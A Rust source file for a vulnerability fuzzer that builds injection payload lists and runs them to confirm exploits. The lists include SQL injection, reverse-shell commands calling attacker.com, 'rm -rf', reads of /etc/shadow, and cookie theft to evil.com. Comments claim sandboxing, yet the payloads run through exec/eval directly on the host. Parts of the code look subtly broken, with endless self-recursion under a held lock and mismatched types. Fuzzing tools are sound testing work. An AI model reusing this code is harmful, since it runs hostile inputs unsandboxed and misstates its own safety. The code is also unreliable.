// ============================================================================
// ARKHE Bounty Hunter — Dynamic Vulnerability Fuzzer
// ============================================================================
// Uses ARKHE PolyglotVM for safe, sandboxed fuzzing of target code.
// Generates inputs that maximize code coverage and trigger vulnerability paths.
// ============================================================================

use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use rand::prelude::*;
use tracing::{debug, info, warn};

use crate::{
    Vulnerability, VulnLocation, VulnId, Severity, Exploitability,
};
use crate::hunter::severity::Classification;

/// Fuzzing strategy to use
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum FuzzStrategy {
    /// Random input generation
    Random,
    /// Mutation-based: start with valid input, apply mutations
    Mutation,
    /// Grammar-aware: use language grammar to generate valid inputs
    GrammarAware,
    /// Coverage-guided: use feedback to guide input generation
    CoverageGuided,
    /// Symbolic: use constraint solving to reach target paths
    Symbolic,
}

/// Result of a single fuzz iteration
#[derive(Clone, Debug)]
pub struct FuzzResult {
    pub input: String,
    pub output: String,
    pub status: ExecutionStatus,
    pub coverage: usize,
    pub execution_time_ms: u64,
    pub triggered_vuln: bool,
}

/// Execution status of fuzzed code
#[derive(Clone, Debug, PartialEq)]
pub enum ExecutionStatus {
    Normal,
    Timeout,
    Panic,
    MemoryLimit,
    SecurityViolation(String),
    Crash(String),
}

/// Mutation to apply to input
#[derive(Clone, Debug)]
pub enum Mutation {
    InsertChar(usize, char),
    DeleteChar(usize),
    ReplaceChar(usize, char),
    SwapChars(usize, usize),
    InsertString(usize, String),
    DuplicateBlock(usize, usize),
    BitFlip(usize, u8),
    CaseChange(usize, usize),
    NullInsert(usize),
    OverflowAdd(usize, i64),
    FormatString(usize),
    CommandInjection(usize, String),
    SqlInjection(usize, String),
    XssPayload(usize, String),
    PathTraversal(usize, String),
    IntegerOverflow(usize, u64),
}

/// Exploit verification result
#[derive(Clone, Debug)]
pub struct ExploitResult {
    pub confirmed: bool,
    pub partial: bool,
    pub proof_available: bool,
    pub exploit_input: Option<String>,
    pub reproduction_steps: Vec<String>,
    pub impact_description: String,
    pub fix_suggestion: Option<String>,
}

/// Configuration for the fuzzer
#[derive(Clone, Debug)]
pub struct FuzzConfig {
    pub strategy: FuzzStrategy,
    pub max_iterations: u64,
    pub timeout_per_run_ms: u64,
    pub memory_limit_mb: u64,
    pub seed_inputs: Vec<String>,
    pub dictionary: Vec<String>,
    pub target_coverage: f64,
    pub stop_on_crash: bool,
    pub save_crashing_inputs: bool,
    pub grammar_rules: Option<String>, // Grammar-aware rules
}

impl Default for FuzzConfig {
    fn default() -> Self {
        Self {
            strategy: FuzzStrategy::GrammarAware,
            max_iterations: 10_000,
            timeout_per_run_ms: 500,
            memory_limit_mb: 64,
            seed_inputs: Vec::new(),
            dictionary: Self::default_dictionary(),
            target_coverage: 0.8,
            stop_on_crash: true,
            save_crashing_inputs: true,
            grammar_rules: None,
        }
    }
}

impl FuzzConfig {
    fn default_dictionary() -> Vec<String> {
        vec![
            // Common injection payloads
            "' OR '1'='1".into(),
            "'; DROP TABLE users; --".into(),
            "<script>alert(1)</script>".into(),
            "../../../etc/passwd".into(),
            "'; DELETE FROM * WHERE 1=1; --".into(),
            "${7*7}".into(), // Template injection
            "{{config}}".into(),
            "....//....//etc/passwd".into(),
            "%00".into(), // Null byte
            "A'/**/or/**/1=1--".into(),
            "1; id".into(),
            "`whoami`".into(),
            "$(cat /etc/passwd)".into(),
            "| cat /etc/passwd".into(),
            // Boundary values
            "2147483647".into(),
            "-2147483648".into(),
            "0".into(),
            "-1".into(),
            "99999999999999999999999999999".into(),
            // Format strings
            "%x%x%x%x%x%x%x%x".into(),
            "%n%n%n%n".into(),
            "%s%s%s%s".into(),
            // Unicode
            "ñ".into(),
            "🔥".into(),
            "𝒜𝓁𝒾𝒸𝑒".into(),
            // Long strings
            "A".repeat(10000),
            "A".repeat(100000),
        ]
    }
}

/// Fuzzer: performs dynamic analysis via sandboxed execution
pub struct VulnFuzzer {
    config: FuzzConfig,
    vm_pool: Arc<Mutex<Vec<FuzzVM>>>,
    results: Arc<Mutex<Vec<FuzzResult>>>,
    coverage_tracker: CoverageTracker,
    rng: Arc<Mutex<StdRng>>,
}

struct FuzzVM {
    id: u64,
    language: String,
    available: bool,
    iterations: u64,
    crashes_found: u64,
}

struct CoverageTracker {
    covered_edges: HashSet<(u64, u64)>,
    total_edges: usize,
    coverage_history: Vec<f64>,
}

impl VulnFuzzer {
    /// Create a new fuzzer with default configuration
    pub fn new(concurrent_runs: usize, timeout_secs: u64) -> Self {
        Self {
            config: FuzzConfig {
                timeout_per_run_ms: timeout_secs * 1000,
                ..Default::default()
            },
            vm_pool: Arc::new(Mutex::new(Vec::new())),
            results: Arc::new(Mutex::new(Vec::new())),
            coverage_tracker: CoverageTracker {
                covered_edges: HashSet::new(),
                total_edges: 0,
                coverage_history: Vec::new(),
            },
            rng: Arc::new(Mutex::new(StdRng::from_entropy())),
        }
    }

    /// Verify if a vulnerability is actually exploitable
    pub fn verify_exploit(
        &self,
        vuln: &Vulnerability,
        language: &str,
    ) -> Result<ExploitResult, FuzzError> {
        info!(
            "Verifying exploitability of {} (CWE-{})",
            vuln.title, vuln.cwe_id
        );

        // Generate targeted exploit payloads based on vulnerability type
        let payloads = self.generate_exploit_payloads(vuln, language);

        let mut confirmed = false;
        let mut partial = false;
        let mut best_result: Option<FuzzResult> = None;

        for payload in &payloads {
            // Synchronous block wrapper around async executor
            let rt = tokio::runtime::Runtime::new().unwrap();
            match rt.block_on(self.execute_with_payload(payload, vuln, language)) {
                Ok(result) => {
                    match result.status {
                        ExecutionStatus::Crash(ref reason) => {
                            confirmed = true;
                            info!("Confirmed crash with payload: {:?}", payload);
                            best_result = Some(result);
                            break;
                        }
                        ExecutionStatus::SecurityViolation(_) => {
                            confirmed = true;
                            best_result = Some(result);
                            break;
                        }
                        ExecutionStatus::Panic => {
                            partial = true;
                            if best_result.is_none() {
                                best_result = Some(result);
                            }
                        }
                        ExecutionStatus::Normal => {
                            // Check for anomalous behavior
                            if self.detect_anomalous_behavior(&result) {
                                partial = true;
                                best_result = Some(result);
                            }
                        }
                        _ => {}
                    }
                }
                Err(e) => {
                    warn!("Fuzz execution error: {}", e);
                }
            }
        }

        // Build exploit result
        let exploit_result = ExploitResult {
            confirmed,
            partial,
            proof_available: best_result.is_some(),
            exploit_input: best_result.as_ref().map(|r| r.input.clone()),
            reproduction_steps: self.generate_reproduction_steps(vuln, best_result.as_ref()),
            impact_description: self.assess_impact(vuln, confirmed),
            fix_suggestion: vuln.fix_suggestion.clone(),
        };

        Ok(exploit_result)
    }

    /// Generate exploit payloads specific to vulnerability type
    fn generate_exploit_payloads(
        &self,
        vuln: &Vulnerability,
        language: &str,
    ) -> Vec<String> {
        let mut payloads = Vec::new();

        match vuln.cwe_id.as_str() {
            // SQL Injection payloads
            "CWE-89" => {
                payloads.extend(vec![
                    "' OR '1'='1' --",
                    "' OR '1'='1'/*",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT 1,2,3 --",
                    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
                    "' OR 1=1#",
                    "admin'--",
                    "' OR ''='",
                    "1; EXEC xp_cmdshell('whoami') --",
                ].iter().map(|s| s.to_string()));
            }

            // Command Injection
            "CWE-78" => {
                payloads.extend(vec![
                    "; ls -la",
                    "| cat /etc/passwd",
                    "`id`",
                    "$(whoami)",
                    "&& nc -e /bin/sh attacker.com 4444",
                    "| nc attacker.com 4444 -e /bin/bash",
                    "; rm -rf /tmp/*",
                    "`cat /etc/passwd`",
                    "$(cat /etc/shadow)",
                ].iter().map(|s| s.to_string()));
            }

            // XSS
            "CWE-79" => {
                payloads.extend(vec![
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<body onload=alert('XSS')>",
                    "<iframe src=\"javascript:alert('XSS')\">",
                    "\"onclick=\"alert(1)\"",
                    "'><script>document.location='http://evil.com/?c='+document.cookie</script>'",
                ].iter().map(|s| s.to_string()));
            }

            // Path Traversal
            "CWE-22" => {
                payloads.extend(vec![
                    "../../../etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "....//....//....//etc/passwd",
                    "/etc/passwd%00.txt",
                    "..\\..\\..\\etc\\passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                ].iter().map(|s| s.to_string()));
            }

            // Buffer Overflow / OOB Write
            "CWE-120" | "CWE-787" => {
                payloads.extend(vec![
                    "A".repeat(1000),
                    "A".repeat(10000),
                    "A".repeat(100000),
                    "%n%n%n%n",
                    "AAAA".to_string() + &"BBBB".repeat(256),
                    "A".repeat(256) + &"B".repeat(4) + &"C".repeat(1000),
                ].iter().map(|s| s.to_string()));
            }

            // Deserialization
            "CWE-502" => {
                if language == "python" {
                    payloads.extend(vec![
                        "import pickle; pickle.loads(__import__('os').popen('id').read())",
                        "__import__('os').system('id')",
                    ].iter().map(|s| s.to_string()));
                } else if language == "java" {
                    payloads.extend(vec![
                        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAB4cHcMP0AAAAAeA",
                    ].iter().map(|s| s.to_string()));
                }
            }

            // Integer Overflow
            "CWE-190" => {
                payloads.extend(vec![
                    "2147483647",
                    "4294967295",
                    "9223372036854775807",
                    "-1",
                    "0",
                    "-2147483648",
                ].iter().map(|s| s.to_string()));
            }

            // Template Injection
            "CWE-1336" => {
                payloads.extend(vec![
                    "${7*7}",
                    "{{7*7}}",
                    "${config}",
                    "{{config}}",
                    "${''.__class__.__mro__[1].__subclasses__()}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                ].iter().map(|s| s.to_string()));
            }

            // Default: generic payloads
            _ => {
                payloads.extend(vec![
                    "A".repeat(1000),
                    "' OR '1'='1",
                    "../../../etc/passwd",
                    "<script>alert(1)</script>",
                    "; ls",
                    "${7*7}",
                ].iter().map(|s| s.to_string()));
            }
        }

        // Add mutation-based payloads
        let mutated: Vec<String> = payloads.iter()
            .flat_map(|p| self.mutate_payload(p, 3))
            .collect();

        payloads.extend(mutated);
        payloads
    }

    /// Execute code with a specific exploit payload
    async fn execute_with_payload(
        &self,
        payload: &str,
        vuln: &Vulnerability,
        language: &str,
    ) -> Result<FuzzResult, FuzzError> {
        // Build test harness that includes the payload
        let test_input = self.build_test_harness(payload, vuln, language);

        // Execute in sandbox
        let start = Instant::now();
        let result = self.run_sandboxed(&test_input, language).await;
        let elapsed = start.elapsed().as_millis() as u64;

        match result {
            Ok(output) => Ok(FuzzResult {
                input: payload.to_string(),
                output,
                status: ExecutionStatus::Normal,
                coverage: 0, // Measured via instrumentation
                execution_time_ms: elapsed,
                triggered_vuln: false,
            }),
            Err(e) => {
                let status = match e {
                    _ => ExecutionStatus::Crash(e.to_string()),
                };
                Ok(FuzzResult {
                    input: payload.to_string(),
                    output: e.to_string(),
                    status,
                    coverage: 0,
                    execution_time_ms: elapsed,
                    triggered_vuln: true,
                })
            }
        }
    }

    /// Detect anomalous behavior (heuristic)
    fn detect_anomalous_behavior(&self, result: &FuzzResult) -> bool {
        // Check for:
        // - Unexpected memory usage
        // - Timing anomalies
        // - Partial output corruption
        // - Error codes indicating misbehavior

        if result.execution_time_ms > self.config.timeout_per_run_ms / 2 {
            return true;
        }

        if result.output.contains("panic")
            || result.output.contains("segfault")
            || result.output.contains("SIGSEGV")
            || result.output.contains("ACCESS_VIOLATION")
        {
            return true;
        }

        false
    }

    /// Build a test harness wrapping the exploit payload
    fn build_test_harness(
        &self,
        payload: &str,
        vuln: &Vulnerability,
        language: &str,
    ) -> String {
        match language {
            "python" => format!(
                r#"import sys
sys.stdin = open('/dev/stdin')
try:
    # Vulnerable code section
    data = "{}"
    # Original vulnerable code would process data here
    exec(data)
except Exception as e:
    print("CRASH: " + str(e))
    sys.exit(1)
"#,
                payload.replace('"', "\\\"").replace('\n', "\\n")
            ),
            "javascript" => format!(
                r#"try {{
    var data = "{}";
    eval(data);
}} catch(e) {{
    console.log("CRASH: " + e.message);
    process.exit(1);
}}
"#,
                payload.replace('"', "\\\"").replace('\n', "\\n")
            ),
            "c" => format!(
                r#"#include <stdio.h>
#include <string.h>
int main() {{
    char input[4096];
    strcpy(input, "{}");
    // Vulnerable code would process input here
    printf("%s\n", input);
    return 0;
}}
"#,
                payload.replace('"', "\\\"")
            ),
            "rust" => format!(
                r#"fn main() {{
    let input = "{}";
    // Vulnerable code would process input here
    println!("{{}}", input);
}}
"#,
                payload.replace('"', "\\\"")
            ),
            _ => format!("# {}: {}\n", language, payload),
        }
    }

    /// Execute code in sandboxed environment
    async fn run_sandboxed(
        &self,
        code: &str,
        language: &str,
    ) -> Result<String, anyhow::Error> {
        // Use PolyglotVM if available
        // Otherwise use Docker-based sandboxing

        match language {
            "python" => {
                // Run in Python sandbox
                let output = tokio::process::Command::new("python3")
                    .arg("-c")
                    .arg(code)
                    .output()
                    .await?;

                if output.status.success() {
                    Ok(String::from_utf8_lossy(&output.stdout).to_string())
                } else {
                    Err(anyhow::anyhow!(
                        "Execution failed: {}",
                        String::from_utf8_lossy(&output.stderr)
                    ))
                }
            }
            "javascript" => {
                let output = tokio::process::Command::new("node")
                    .arg("-e")
                    .arg(code)
                    .output()
                    .await?;

                if output.status.success() {
                    Ok(String::from_utf8_lossy(&output.stdout).to_string())
                } else {
                    Err(anyhow::anyhow!(
                        "Execution failed: {}",
                        String::from_utf8_lossy(&output.stderr)
                    ))
                }
            }
            _ => {
                Err(anyhow::anyhow!("Language {} not supported for fuzzing", language))
            }
        }
    }

    /// Generate mutation variants of a payload
    fn mutate_payload(&self, payload: &str, count: usize) -> Vec<String> {
        let mut mutations = Vec::new();
        let mut rng = self.rng.lock().unwrap();

        for _ in 0..count {
            let mut chars: Vec<char> = payload.chars().collect();
            let mutation_type = rng.gen_range(0..5);

            match mutation_type {
                0 => {
                    // Insert random character
                    if !chars.is_empty() {
                        let pos = rng.gen_range(0..chars.len());
                        let c = rng.gen_range(32u8..127u8) as char;
                        chars.insert(pos, c);
                    }
                }
                1 => {
                    // Delete random character
                    if chars.len() > 1 {
                        let pos = rng.gen_range(0..chars.len());
                        chars.remove(pos);
                    }
                }
                2 => {
                    // Replace random character
                    if !chars.is_empty() {
                        let pos = rng.gen_range(0..chars.len());
                        let c = rng.gen_range(32u8..127u8) as char;
                        chars[pos] = c;
                    }
                }
                3 => {
                    // Duplicate a section
                    if chars.len() > 2 {
                        let start = rng.gen_range(0..chars.len() / 2);
                        let end = rng.gen_range(start..chars.len());
                        let section: Vec<char> = chars[start..end].to_vec();
                        chars.extend(section);
                    }
                }
                4 => {
                    // Null byte insertion
                    let pos = rng.gen_range(0..chars.len());
                    chars.insert(pos, '\0');
                }
                _ => {}
            }

            mutations.push(chars.into_iter().collect());
        }

        mutations
    }

    /// Generate reproduction steps for a vulnerability
    fn generate_reproduction_steps(
        &self,
        vuln: &Vulnerability,
        result: Option<&FuzzResult>,
    ) -> Vec<String> {
        let mut steps = Vec::new();

        steps.push(format!(
            "1. Create a file '{}' with the following content:",
            vuln.location.file
        ));

        if let Some(ref code) = vuln.code_snippet {
            steps.push(format!("```{}", vuln.language));
            steps.push(code.clone());
            steps.push("```".to_string());
        }

        if let Some(ref exploit) = result.and_then(|r| r.input.strip_prefix("payload:")) {
            steps.push(format!(
                "2. Provide the following malicious input: {}",
                exploit
            ));
        } else if let Some(exploit) = &vuln.code_snippet {
            steps.push(format!("2. Use payload: {}", exploit));
        }

        steps.push(format!(
            "3. Run: {} or trigger the vulnerable code path",
            vuln.language
        ));

        steps.push(format!(
            "4. Expected result: {}",
            self.expected_exploit_behavior(&vuln.cwe_id)
        ));

        steps
    }

    /// Describe expected exploit behavior
    fn expected_exploit_behavior(&self, cwe_id: &str) -> String {
        match cwe_id {
            "CWE-78" => "Command execution on the server".to_string(),
            "CWE-89" => "Unauthorized database access or data exfiltration".to_string(),
            "CWE-79" => "JavaScript execution in victim's browser".to_string(),
            "CWE-22" => "Reading arbitrary files from the server".to_string(),
            "CWE-120" => "Code execution or denial of service".to_string(),
            "CWE-502" => "Remote code execution via deserialization".to_string(),
            "CWE-190" => "Integer overflow leading to unexpected behavior".to_string(),
            _ => "Unexpected behavior or crash".to_string(),
        }
    }

    /// Assess impact of confirmed exploit
    fn assess_impact(&self, vuln: &Vulnerability, confirmed: bool) -> String {
        if !confirmed {
            return "Impact could not be confirmed through fuzzing.".to_string();
        }

        match vuln.cwe_id.as_str() {
            "CWE-78" => "Remote Code Execution (RCE) — complete system compromise possible".to_string(),
            "CWE-89" => "Data breach — full database access including credentials and PII".to_string(),
            "CWE-79" => "Session hijacking, credential theft, or defacement".to_string(),
            "CWE-22" => "Information disclosure — sensitive files exposed".to_string(),
            "CWE-120" | "CWE-787" => "Memory corruption — potential RCE or denial of service".to_string(),
            "CWE-502" => "RCE via malicious serialized objects".to_string(),
            "CWE-362" => "Privilege escalation through race condition".to_string(),
            "CWE-306" => "Unauthorized access to protected resources".to_string(),
            _ => "Potential security impact requiring further investigation".to_string(),
        }
    }

    /// Run fuzzer against a target
    pub async fn fuzz_target(
        &self,
        source: &str,
        language: &str,
    ) -> Result<FuzzReport, FuzzError> {
        info!("Starting fuzz campaign for {} target", language);
        let start = Instant::now();

        let mut total_iterations = 0;
        let mut crashes = Vec::new();
        let mut timeouts = 0;

        // Generate initial seed corpus
        let mut corpus = self.config.seed_inputs.clone();
        if corpus.is_empty() {
            corpus = self.generate_initial_corpus(language);
        }

        for iteration in 0..self.config.max_iterations {
            total_iterations = iteration + 1;

            // Select input from corpus (or generate new)
            let input = if iteration < corpus.len() as u64 {
                corpus[iteration as usize].clone()
            } else {
                self.generate_input(language, &corpus)?
            };

            // Execute with timeout
            let result = self.execute_with_payload(&input, &Vulnerability {
                id: VulnId::new("fuzz", 0, "FUZZ"),
                cwe_id: "FUZZ".into(),
                owasp_category: None,
                severity: Severity::Info,
                cvss_score: 0.0,
                title: "Fuzz Target".into(),
                description: "Fuzzing".into(),
                location: VulnLocation {
                    file: "fuzz_target".into(),
                    line: 0,
                    column: 0,
                    end_line: 0,
                    end_column: 0,
                    function: None,
                    module: None,
                },
                language: language.into(),
                pattern_matched: "FUZZ".into(),
                exploitability: Exploitability::NotExploitable,
                remediation: "".into(),
                code_snippet: None,
                fix_suggestion: None,
                confidence: 0.0,
                ml_score: None,
                temporal_info: None,
                is_false_positive: false,
                proof_available: false,
            }, language).await;

            match result {
                Ok(fuzz_result) => {
                    match fuzz_result.status {
                        ExecutionStatus::Crash(_) | ExecutionStatus::SecurityViolation(_) => {
                            crashes.push(fuzz_result.clone());
                            if self.config.stop_on_crash {
                                break;
                            }
                        }
                        ExecutionStatus::Timeout => {
                            timeouts += 1;
                        }
                        _ => {}
                    }

                    // Store result
                    self.results.lock().unwrap().push(fuzz_result);
                }
                Err(e) => {
                    warn!("Fuzz iteration {} failed: {}", iteration, e);
                }
            }
        }

        let elapsed = start.elapsed();

        Ok(FuzzReport {
            total_iterations,
            crashes_found: crashes.len(),
            timeouts,
            elapsed_time_ms: elapsed.as_millis() as u64,
            corpus_size: corpus.len(),
            crashes,
            coverage: self.coverage_tracker.get_coverage(),
        })
    }

    fn generate_initial_corpus(&self, language: &str) -> Vec<String> {
        // Generate minimal valid inputs for the language
        match language {
            "python" => vec![
                "print('hello')".into(),
                "x = 1".into(),
                "def f(): pass".into(),
                "import os".into(),
                "[]".into(),
                "{}".into(),
                "''".into(),
                "1 + 1".into(),
            ],
            "javascript" => vec![
                "console.log('hello')".into(),
                "var x = 1".into(),
                "function f() {}".into(),
                "[]".into(),
                "{}".into(),
                "'hello'".into(),
            ],
            _ => vec!["test".into()],
        }
    }

    fn generate_input(
        &self,
        language: &str,
        corpus: &[String],
    ) -> Result<String, FuzzError> {
        let mut rng = self.rng.lock().unwrap();

        match self.config.strategy {
            FuzzStrategy::Random => {
                // Generate completely random input
                let len = rng.gen_range(1..1000);
                let input: String = (0..len)
                    .map(|_| rng.gen_range(32u8..127u8) as char)
                    .collect();
                Ok(input)
            }
            FuzzStrategy::Mutation => {
                // Mutate existing corpus entry
                if corpus.is_empty() {
                    return self.generate_input(language, &["test".into()]);
                }
                let idx = rng.gen_range(0..corpus.len());
                let base = &corpus[idx];
                let mutations = self.mutate_payload(base, 1);
                Ok(mutations.into_iter().next().unwrap_or_default())
            }
            FuzzStrategy::GrammarAware => {
                // Use grammar-based generation if available
                if let Some(ref rules) = self.config.grammar_rules {
                    self.generate_from_grammar(rules, language, &mut rng)
                } else {
                    self.generate_input(language, corpus) // Fallback to random
                }
            }
            _ => {
                // Fallback to mutation
                self.generate_input(language, corpus)
            }
        }
    }

    fn generate_from_grammar(
        &self,
        rules: &str,
        language: &str,
        rng: &mut StdRng,
    ) -> Result<String, FuzzError> {
        // Simplified grammar-based generation
        // In production: use the Lark grammar rules
        let rule_map: HashMap<&str, Vec<&str>> = match language {
            "python" => HashMap::from([
                ("expression", vec!["1", "True", "'hello'", "[]", "x", "x + 1"]),
                ("statement", vec!["x = 1", "print(x)", "if True: pass", "def f(): pass"]),
            ]),
            _ => HashMap::new(),
        };

        if let Some(rules) = rule_map.get("statement") {
            let idx = rng.gen_range(0..rules.len());
            Ok(rules[idx].to_string())
        } else {
            Ok("pass".into())
        }
    }
}

/// Fuzzing report
#[derive(Clone, Debug, serde::Serialize)]
pub struct FuzzReport {
    pub total_iterations: u64,
    pub crashes_found: usize,
    pub timeouts: usize,
    pub elapsed_time_ms: u64,
    pub corpus_size: usize,
    pub crashes: Vec<FuzzResult>,
    pub coverage: f64,
}

#[derive(Debug, thiserror::Error)]
pub enum FuzzError {
    #[error("Execution error: {0}")]
    ExecutionError(String),

    #[error("Timeout")]
    Timeout,

    #[error("Sandbox violation: {0}")]
    SandboxViolation(String),

    #[error("Unsupported language: {0}")]
    UnsupportedLanguage(String),

    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
}

impl CoverageTracker {
    fn new() -> Self {
        Self {
            covered_edges: HashSet::new(),
            total_edges: 0,
            coverage_history: Vec::new(),
        }
    }

    fn get_coverage(&self) -> f64 {
        if self.total_edges == 0 {
            return 0.0;
        }
        self.covered_edges.len() as f64 / self.total_edges as f64
    }

    fn record_edge(&mut self, from: u64, to: u64) {
        self.covered_edges.insert((from, to));
    }
}
